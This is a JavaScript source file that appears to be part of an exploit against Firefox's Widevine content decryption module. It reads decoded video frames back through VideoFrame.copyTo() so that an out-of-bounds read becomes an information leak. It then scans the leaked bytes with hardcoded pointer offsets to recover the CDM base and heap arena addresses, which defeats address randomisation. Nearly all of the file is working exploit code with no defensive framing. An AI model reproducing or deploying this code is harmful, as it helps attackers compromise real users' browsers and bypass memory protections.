// VideoFrame readback + leak-frame scanners.
//
// Firefox doesn't taint CDM-decoded VideoFrames, so copyTo() lets JS read the
// decoded planes back. That turns the SPS-geometry OOB read into an in-band
// info leak (software-only Widevine is considered broken anyway).

export class FrameReader {
  constructor(video) {
    this.video = video;
    this.frames = [];
    this._stop = false;
    this._handle = 0;
    this._seenHashes = new Set();
    this.stats = {
      ticks: 0,
      vfErrors: new Map(),
      copyErrors: new Map(),
      captured: 0,
    };
  }

  start() {
    this._stop = false;
    const v = this.video;
    const hasMSTP = typeof MediaStreamTrackProcessor === 'function';
    const hasCapStream = typeof v.captureStream === 'function';
    this.stats.startPath = `MSTP=${hasMSTP} captureStream=${hasCapStream}`;
    if (hasMSTP && hasCapStream) {
      this._initTrackProcessor(v);
      return;
    }
    // Fallback: rVFC + setInterval polling (per-presented frame only).
    if (typeof v.requestVideoFrameCallback === 'function') {
      const cb = (now, meta) => {
        if (this._stop) return;
        this._tickOnce(meta);
        this._handle = v.requestVideoFrameCallback(cb);
      };
      this._handle = v.requestVideoFrameCallback(cb);
    }
    this._poll = setInterval(() => {
      if (this._stop) return;
      this._tickOnce(null);
    }, 4);
  }

  async _initTrackProcessor(v) {
    let stream;
    try {
      stream = v.captureStream();
    } catch (e) {
      this.stats.captureStreamError = `${e?.name ?? typeof e}: ${e?.message ?? e}`;
      return;
    }
    const track = stream.getVideoTracks()[0];
    if (!track) {
      this.stats.captureStreamError = 'no video track';
      return;
    }
    let proc;
    try {
      proc = new MediaStreamTrackProcessor({ track });
    } catch (e) {
      this.stats.captureStreamError = `MSTP: ${e?.name ?? typeof e}: ${e?.message ?? e}`;
      return;
    }
    const reader = proc.readable.getReader();
    this._mstpReader = reader;
    while (!this._stop) {
      let res;
      try {
        res = await reader.read();
      } catch (e) {
        this.stats.copyErrors.set(`read:${e?.name}`, (this.stats.copyErrors.get(`read:${e?.name}`) ?? 0) + 1);
        break;
      }
      if (res.done) break;
      const vf = res.value;
      await this._consumeFrame(vf);
    }
  }

  async _consumeFrame(vf) {
    this.stats.ticks++;
    try {
      const size = vf.allocationSize();
      const buf = new ArrayBuffer(size);
      const layout = await vf.copyTo(buf);
      const yLayout = layout[0];
      const u8 = new Uint8Array(buf);
      let h = 5381;
      for (let i = 0; i < 64 && yLayout.offset + i < u8.length; i++) {
        h = ((h * 33) ^ u8[yLayout.offset + i]) | 0;
      }
      if (this._seenHashes.has(h)) return;
      this._seenHashes.add(h);
      this.frames.push({
        buf: u8, layout,
        codedWidth: vf.codedWidth, codedHeight: vf.codedHeight,
        timestamp: vf.timestamp, format: vf.format,
      });
      this.stats.captured++;
      if (this.stats.captured === 1) {
        this.stats.firstFormat = vf.format;
        this.stats.firstLayout = layout;
      }
    } catch (e) {
      const name = e?.name ?? typeof e;
      this.stats.copyErrors.set(name, (this.stats.copyErrors.get(name) ?? 0) + 1);
    } finally {
      try { vf.close(); } catch (_) {}
    }
  }

  async _tickOnce(meta) {
    if (this._stop) return;
    this.stats.ticks++;
    let vf = null;
    try {
      vf = new VideoFrame(this.video);
    } catch (e) {
      const name = e?.name ?? typeof e;
      this.stats.vfErrors.set(name, (this.stats.vfErrors.get(name) ?? 0) + 1);
      this.stats.vfErrorMsg ??= {};
      if (!this.stats.vfErrorMsg[name]) {
        this.stats.vfErrorMsg[name] = e?.message ?? String(e);
      }
      return;
    }
    try {
      const size = vf.allocationSize();
      const buf = new ArrayBuffer(size);
      const layout = await vf.copyTo(buf);
      // Per-tick instrumentation: track unique (dim, content-hash) tuples
      // so we can see if Firefox swaps to leak frames at any point.
      this.stats.tickHistory ??= [];
      this.stats.tickSeen ??= new Set();
      // Dedupe by content: hash the first 64 bytes of the Y plane (timestamp
      // dedup is useless since Firefox quantizes VideoFrame.timestamp to seconds).
      const yLayout = layout[0];
      const u8 = new Uint8Array(buf);
      let h = 5381;
      for (let i = 0; i < 64 && yLayout.offset + i < u8.length; i++) {
        h = ((h * 33) ^ u8[yLayout.offset + i]) | 0;
      }
      const sig = `${vf.codedWidth}x${vf.codedHeight}#${(h >>> 0).toString(16)}`;
      if (!this.stats.tickSeen.has(sig) && this.stats.tickHistory.length < 64) {
        this.stats.tickSeen.add(sig);
        this.stats.tickHistory.push({
          ts: vf.timestamp, w: vf.codedWidth, h: vf.codedHeight,
          contentHash: h >>> 0,
        });
      }
      if (this._seenHashes.has(h)) {
        vf.close();
        return;
      }
      this._seenHashes.add(h);
      this.frames.push({
        buf: u8,
        layout,
        codedWidth: vf.codedWidth,
        codedHeight: vf.codedHeight,
        timestamp: vf.timestamp,
        format: vf.format,
      });
      this.stats.captured++;
      if (this.stats.captured === 1) {
        this.stats.firstFormat = vf.format;
        this.stats.firstLayout = layout;
      }
    } catch (e) {
      const name = e?.name ?? typeof e;
      this.stats.copyErrors.set(name, (this.stats.copyErrors.get(name) ?? 0) + 1);
    } finally {
      try { vf.close(); } catch (_) {}
    }
  }

  stop() {
    this._stop = true;
    const v = this.video;
    if (typeof v.cancelVideoFrameCallback === 'function' && this._handle) {
      try { v.cancelVideoFrameCallback(this._handle); } catch (_) {}
    }
    if (this._poll) {
      try { clearInterval(this._poll); } catch (_) {}
    }
    if (this._mstpReader) {
      try { this._mstpReader.cancel(); } catch (_) {}
    }
    this._handle = 0;
    this._poll = 0;
    this._mstpReader = null;
  }

  summary() {
    const errMap = (m) => Array.from(m.entries())
      .map(([k, v]) => `${k}=${v}`).join(',') || 'none';
    const fmt = this.stats.firstFormat
      ? ` format=${this.stats.firstFormat}` : '';
    const tickHist = (this.stats.tickHistory ?? [])
      .map((t) => `${t.w}x${t.h}#${(t.contentHash ?? 0).toString(16)}`)
      .join(',') || 'none';
    const path = ` path=[${this.stats.startPath ?? '?'}]`;
    const mstp = this.stats.captureStreamError
      ? ` mstpErr=${this.stats.captureStreamError}` : '';
    const vfMsgs = this.stats.vfErrorMsg
      ? ' vfMsg=' + Object.entries(this.stats.vfErrorMsg)
          .map(([n, m]) => `${n}:"${m}"`).join('|')
      : '';
    return `ticks=${this.stats.ticks} captured=${this.stats.captured}` +
           fmt + path + mstp +
           ` vfErr=${errMap(this.stats.vfErrors)}` + vfMsgs +
           ` copyErr=${errMap(this.stats.copyErrors)}` +
           ` history=[${tickHist}]`;
  }

  // Return only the Y plane bytes for a captured frame.
  yPlane(frame) {
    const yLayout = frame.layout[0];
    return frame.buf.subarray(yLayout.offset,
                              yLayout.offset + yLayout.stride * frame.codedHeight);
  }
}

// ----- Leak scanners -----

// Known cdm-base-relative offsets of pointers that show up in the leaked
// window. The scanner subtracts each from every libc-shaped qword; a 4 KB-
// aligned result is a cdm_base candidate. More offsets = more chance any
// single leaked window yields a recognizable hit.
const CDM_LEAK_KNOWN_OFFSETS = [
  0x114e518n,  // cluster+0x00 (vtable-like)
  0x114fdd0n,  // cluster+0x18 (vtable-like)
  0x4571078n,  // cluster+0x48 (some cdm-internal struct ptr)
  0x456efc0n,  // sp0_metadata PartitionRoot ptr +0x00
  0x4570058n,  // sp0_metadata PartitionRoot+0x30 onwards
  0xb53c75n,   // picbuf descriptor slot +0x00 (fn ptr)
  0xb2b576n,   // picbuf descriptor slot +0x08 (fn ptr)
];

// Heuristic ranges for "pointer-shaped" qwords on x86-64 Linux (47-bit user
// VA). Libraries and the CDM map high (hi16 ~0x70..0x7fff); the
// partition_alloc arena pool sits below that. The 0x7000 floor keeps real CDM
// pointers (which can map as low as ~0x76xx) while staying above any arena
// high-half, so the two never get misclassified.
const PTR_USER_VA_LIMIT = 0x800000000000n;            // 47-bit cap
const LIBC_AREA_HI_MIN = 0x7000n;                     // libxul/libc/cdm live here
const LIBC_AREA_HI_MAX = 0x7fffn;
const ARENA_HI_MIN_GB = 0x10n;                        // ~64 GB floor (above heap)
const ARENA_HI_MAX = 0x7e00n;                         // below libc area

function isLibcShape(q) {
  if (q >= PTR_USER_VA_LIMIT) return false;
  const hi16 = (q >> 32n) & 0xffffn;
  return hi16 >= LIBC_AREA_HI_MIN && hi16 <= LIBC_AREA_HI_MAX;
}

function isArenaShape(q) {
  if (q >= PTR_USER_VA_LIMIT) return false;
  const hi = q >> 32n;
  const lo = q & 0xffffffffn;
  // High 32 bits: above heap (64 GB) but below libc area, AND
  // low 32 bits look like an arena offset (within ~256 MB of pool start).
  return hi >= ARENA_HI_MIN_GB && hi < ARENA_HI_MAX &&
         lo >= 0x1000n && lo < 0x10000000n;
}

// Walk the plane once, collect every plausible pointer.
// Returns { cdm: [{ off, q }], arena: [{ off, q }] }.
function collectPointers(yPlane) {
  const dv = new DataView(yPlane.buffer, yPlane.byteOffset, yPlane.byteLength);
  const out = { cdm: [], arena: [] };
  for (let i = 0; i + 8 <= yPlane.byteLength; i += 8) {
    const q = dv.getBigUint64(i, true);
    if (q === 0n) continue;
    if (isLibcShape(q))   out.cdm.push({ off: i, q });
    if (isArenaShape(q))  out.arena.push({ off: i, q });
  }
  return out;
}

// Derive cdm_base: subtract each known offset from every libc-shaped qword;
// a 4 KB-aligned result is a candidate, and the candidate agreed on by the
// most qwords wins.
export function scanCdmBase(yPlane) {
  const { cdm } = collectPointers(yPlane);
  if (cdm.length === 0) return null;
  // Map candidate cdm_base → number of (qword, offset) pairs that produced it.
  const candidates = new Map();
  for (const { q } of cdm) {
    for (const off of CDM_LEAK_KNOWN_OFFSETS) {
      if (q < off) continue;
      const cand = q - off;
      if ((cand & 0xfffn) !== 0n) continue;
      const key = cand.toString(16);
      candidates.set(key, (candidates.get(key) || 0) + 1);
    }
  }
  if (candidates.size === 0) return null;
  // Prefer the candidate with the most cross-validation hits.
  let bestKey = null, bestScore = 0;
  for (const [k, v] of candidates) {
    if (v > bestScore) { bestScore = v; bestKey = k; }
  }
  return BigInt('0x' + bestKey);
}

// Derive arena_base. Two layouts:
//   DUAL-POOL: arena_base is 4 GB-aligned in its own pool; tally arena-shape
//     pointers by 4 GB-aligned high half and take the most popular.
//   SINGLE-POOL (cdmBase passed): cdm and arena share one 64 GB pool, so the
//     arena self-pointer looks libc-shaped. Back out each known arena offset
//     from such qwords and accept a 2 MB-aligned result in cdm's pool.
const ARENA_KNOWN_OFFSETS_2MB_ALIGNED = [
  0xaa4000n,  // cluster (arena+0xaa4000) — q[1] = arena+0xaa4000 self-ptr
  0x108000n,  // dctx — known arena offset (rip.js CTX_OFF_DEFAULT)
  0x1dc000n,  // sps_slab — partition_alloc-managed island start
];
export function scanArenaBase(yPlane, cdmBase = null) {
  const ptrs = collectPointers(yPlane);
  const tally = new Map();

  // DUAL-POOL: arena-shape pointers, tallied by 4-GB-aligned high half.
  for (const { q } of ptrs.arena) {
    const k = (q & ~0xffffffffn).toString(16);
    tally.set(k, (tally.get(k) || 0) + 1);
  }

  // SINGLE-POOL: libc-shape pointers in cdm_base's 64-GB pool that are
  // NOT recognised as cdm pointers — treat as candidate arena+offset.
  if (cdmBase) {
    const cdmPool = cdmBase & ~0xfffffffffn;  // 64-GB pool boundary
    const knownCdmValues = new Set();
    for (const off of CDM_LEAK_KNOWN_OFFSETS) {
      knownCdmValues.add((cdmBase + off).toString(16));
    }
    for (const { q } of ptrs.cdm) {
      if ((q & ~0xfffffffffn) !== cdmPool) continue;
      if (knownCdmValues.has(q.toString(16))) continue;
      for (const off of ARENA_KNOWN_OFFSETS_2MB_ALIGNED) {
        if (q < off) continue;
        const cand = q - off;
        if ((cand & 0x1fffffn) !== 0n) continue;       // must be 2-MB aligned
        if ((cand & ~0xfffffffffn) !== cdmPool) continue; // and in cdm's pool
        const k = cand.toString(16);
        tally.set(k, (tally.get(k) || 0) + 1);
      }
    }
  }

  if (tally.size === 0) return null;
  let bestKey = null, bestScore = 0;
  for (const [k, v] of tally) {
    if (v > bestScore) { bestScore = v; bestKey = k; }
  }
  return BigInt('0x' + bestKey);
}

// Scan every captured frame's Y plane for cdm_base and arena_base, returning
// them plus per-frame pointer lists for diagnostics. cdm_base is found first
// so it can feed the single-pool arena path.
export function scanLeakFrames(frames, frameReader) {
  let cdmBase = null;
  let arenaBase = null;
  const diag = [];
  const yPlanes = [];
  for (const f of frames) {
    const y = frameReader.yPlane(f);
    yPlanes.push(y);
    if (!cdmBase) cdmBase = scanCdmBase(y);
    diag.push(collectPointers(y));
  }
  for (const y of yPlanes) {
    if (arenaBase) break;
    // Dual-pool only (no cdmBase): the CDM and arena live in separate
    // 4 GB-aligned pools here, so the dual-pool tally recovers the real arena
    // from the cluster's self-pointer. Passing cdmBase would enable the
    // single-pool path, which derives a wrong cdm-pool address that outvotes it.
    arenaBase = scanArenaBase(y);
  }
  return { cdmBase, arenaBase, diag };
}
